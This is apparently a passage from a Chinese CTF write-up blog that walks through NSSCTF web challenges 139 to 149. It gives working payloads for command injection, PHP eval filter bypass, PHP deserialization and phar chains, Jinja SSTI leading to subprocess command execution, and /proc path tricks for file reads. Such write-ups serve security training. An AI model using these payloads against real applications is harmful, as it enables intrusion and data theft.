<h1 id="139-NSSRound-7-Team-ec-RCE"><a href="#139-NSSRound-7-Team-ec-RCE" class="headerlink" title="139.[NSSRound#7 Team]ec_RCE"></a>139.[NSSRound#7 Team]ec_RCE</h1><p>payload:<code>POST action=|cat /flag&amp;data=1</code></p>
<h1 id="140-GXYCTF-2019-禁止套娃"><a href="#140-GXYCTF-2019-禁止套娃" class="headerlink" title="140.[GXYCTF 2019]禁止套娃"></a>140.[GXYCTF 2019]禁止套娃</h1><p>两种办法，本质都是绕过waf。</p>
<p>1、session注入</p>
<p>扫目录发现git泄露，然后用githacker拿下源码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://node4.anna.nssctf.cn:28396/ --output-folder out</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>cookie传参设置<code>session_id</code>的值，使用<code>session_start</code>来开启，使用<code>show_source</code>来读取</p>
<p><img src="/images/image-20231215163217550.png" alt="image-20231215163217550"></p>
<p>2、读取环境变量并输出</p>
<p><code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></p>
<h1 id="141-MoeCTF-2021-Do-you-know-HTTP"><a href="#141-MoeCTF-2021-Do-you-know-HTTP" class="headerlink" title="141.[MoeCTF 2021]Do you know HTTP"></a>141.[MoeCTF 2021]Do you know HTTP</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HS / HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:28033</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: LT</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Referer: www.ltyyds.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>四个点：</p>
<p>1、请求方法</p>
<p>2、UA</p>
<p>3、XFF</p>
<p>4、Referer</p>
<h1 id="142-HNCTF-2022-WEEK3-ssssti"><a href="#142-HNCTF-2022-WEEK3-ssssti" class="headerlink" title="142.[HNCTF 2022 WEEK3]ssssti"></a>142.[HNCTF 2022 WEEK3]ssssti</h1><p>焚靖一把梭</p>
<h1 id="143-FSCTF-2023-细狗2-0"><a href="#143-FSCTF-2023-细狗2-0" class="headerlink" title="143.[FSCTF 2023]细狗2.0"></a>143.[FSCTF 2023]细狗2.0</h1><p>waf不知道，fuzz一下用分号闭合然后执行个ls发现有回显</p>
<p><code>1;ls /</code>被waf，绕过空格</p>
<p><code>1;ls$&#123;IFS&#125;/</code>可以看到flag，cat和flag都被waf</p>
<p><code>1;nl$&#123;IFS&#125;/f*</code>即可</p>
<h1 id="144-HZNUCTF-2023-preliminary-ppppop"><a href="#144-HZNUCTF-2023-preliminary-ppppop" class="headerlink" title="144.[HZNUCTF 2023 preliminary]ppppop"></a>144.[HZNUCTF 2023 preliminary]ppppop</h1><p>一看就又是一道php反序列化</p>
<p>抓包发现setcookie，解b64得</p>
<p><code>O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;</code>，0改成1可以看到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;utils.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$className</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$funcName</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$class</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;className;</span><br><span class="line">        <span class="variable">$funcName</span> = <span class="variable language_">$this</span>-&gt;funcName;</span><br><span class="line">        <span class="variable">$class</span>-&gt;<span class="variable">$funcName</span>(<span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">checkUser</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]));</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写个exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$className</span> = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$funcName</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>=<span class="string">&#x27;ls /&#x27;</span>; <span class="comment">#env</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$class</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;className;</span><br><span class="line">        <span class="variable">$funcName</span> = <span class="variable language_">$this</span>-&gt;funcName;</span><br><span class="line">        <span class="variable">$class</span>-&gt;<span class="variable">$funcName</span>(<span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$func</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现根目录下没有flag，读取env即可</p>
<p><code>payload:POST payload=fTsidm5lIjozOnM7InNncmEiOjQ6czsibWV0c3lzIjo2OnM7ImVtYU5jbnVmIjo4OnM7IkIiOjE6czsiZW1hTnNzYWxjIjo5OnN7OjM6IkEiOjE6Tw==</code></p>
<h1 id="145-HNCTF-2022-WEEK2-Canyource"><a href="#145-HNCTF-2022-WEEK2-Canyource" class="headerlink" title="145.[HNCTF 2022 WEEK2]Canyource"></a>145.[HNCTF 2022 WEEK2]Canyource</h1><p>新姿势，执行读取当前变量的代码，然后给一个新的变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;b=system(&quot;nl flag.php&quot;)</span><br></pre></td></tr></table></figure>

<p>f12看到flag</p>
<p>或者</p>
<p><code>?code=readfile(next(array_reverse(scandir(pos(localeconv())))));</code></p>
<p>第二个方法的过程，本地调试首先执行<code>localeconv()</code>，可以发现返回的是Array</p>
<p>然后执行<code>pos()</code>，返回的是<code>.</code>，即当前目录的意思，那么往前走到scandir，就是获取当前目录下的文件列表，并以数组形式返回，相当于ls命令，然后数组起始位置是.，下一个是..，接下来是文件夹里的文件，所以进行一个倒序，就保证是文件夹内的文件，然后取next，获取的是文件名，然后readfile输出文件内容</p>
<h1 id="146-WUSTCTF-2020-CV-Maker"><a href="#146-WUSTCTF-2020-CV-Maker" class="headerlink" title="146.[WUSTCTF 2020]CV Maker"></a>146.[WUSTCTF 2020]CV Maker</h1><p>感觉是非预期，扫目录发现phpinfo.php或者git泄露，githacker，dump下来也是有phpinfo.php，访问getflag，预期解是注册账号然后上传头像为一句话，蚁剑连接根目录<code>./readflag</code>、或者env</p>
<h1 id="147-CISCN-2019华东南-Double-Secret"><a href="#147-CISCN-2019华东南-Double-Secret" class="headerlink" title="147.[CISCN 2019华东南]Double Secret"></a>147.[CISCN 2019华东南]Double Secret</h1><p>BUU以前做过，&#x2F;secret，传secret，rc4加密后的结果，脚本拿过来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):<span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64) </span></span><br></pre></td></tr></table></figure>

<p>payload一步步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125; #回显str、basestring、object所以获取object</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>写个脚本找调用os的子进程，subprocess.Popen</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l = [...]<span class="comment">#回显的一堆子类</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;subprocess.Popen&#x27;</span> <span class="keyword">in</span> l[i]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i,l[i]))</span><br><span class="line"><span class="comment"># 239 &lt;class &#x27;subprocess.Popen&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload继续</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[239](&#x27;ls /&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[239](&#x27;cat /flag.txt&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="148-NSSRound-8-Basic-MyPage"><a href="#148-NSSRound-8-Basic-MyPage" class="headerlink" title="148.[NSSRound#8 Basic]MyPage"></a>148.[NSSRound#8 Basic]MyPage</h1><p>WMCTF的Make PHP Great Again 2.0的require_once绕过，原理：require-once如果包含过多软链接就会失效。payload通杀，读取的是&#x2F;self&#x2F;cwd下的flag.php，路径就纯脑洞了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/self/cwd/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="149-SWPUCTF-2021-新生赛-babyunser"><a href="#149-SWPUCTF-2021-新生赛-babyunser" class="headerlink" title="149.[SWPUCTF 2021 新生赛]babyunser"></a>149.[SWPUCTF 2021 新生赛]babyunser</h1><p>phar反序列化</p>
<p>查看文件，查询read.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;aa的文件查看器&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .search_form&#123;</span><br><span class="line">            width:602px;</span><br><span class="line">            height:42px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /*左边输入框设置样式*/</span><br><span class="line">        .input_text&#123;</span><br><span class="line">            width:400px;</span><br><span class="line">            height: 40px;</span><br><span class="line">            border:1px solid green;</span><br><span class="line">            /*清除掉默认的padding*/</span><br><span class="line">            padding:0px;</span><br><span class="line">            /*提示字首行缩进*/</span><br><span class="line">            text-indent: 10px;</span><br><span class="line"></span><br><span class="line">            /*去掉蓝色高亮框*/</span><br><span class="line">            outline: none;</span><br><span class="line"></span><br><span class="line">            /*用浮动解决内联元素错位及小间距的问题*/</span><br><span class="line">            float:left;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .input_sub&#123;</span><br><span class="line">            width:100px;</span><br><span class="line">            height: 42px;</span><br><span class="line">            background: green;</span><br><span class="line">            text-align:center;</span><br><span class="line">            /*去掉submit按钮默认边框*/</span><br><span class="line">            border:0px;</span><br><span class="line">            /*改成右浮动也是可以的*/</span><br><span class="line">            float:left;</span><br><span class="line">            color:white;/*搜索的字体颜色为白色*/</span><br><span class="line">            cursor:pointer;/*鼠标变为小手*/</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file_content&#123;</span><br><span class="line">            width:500px;</span><br><span class="line">            height: 242px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">include(&#x27;class.php&#x27;);</span><br><span class="line">$a=new aa();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;aa的文件查看器&lt;/h1&gt;</span><br><span class="line">&lt;form class=&quot;search_form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; class=&quot;input_text&quot; placeholder=&quot;请输入搜索内容&quot; name=&quot;file&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;查看&quot; class=&quot;input_sub&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$filename=$_POST[&#x27;file&#x27;];</span><br><span class="line">if(!isset($filename))&#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$file=new zz($filename);</span><br><span class="line">$contents=$file-&gt;getFile();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;textarea class=&quot;file_content&quot; type=&quot;text&quot; value=&lt;?php echo &quot;&lt;br&gt;&quot;.$contents;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>include了一个class.php，读取看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;aa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 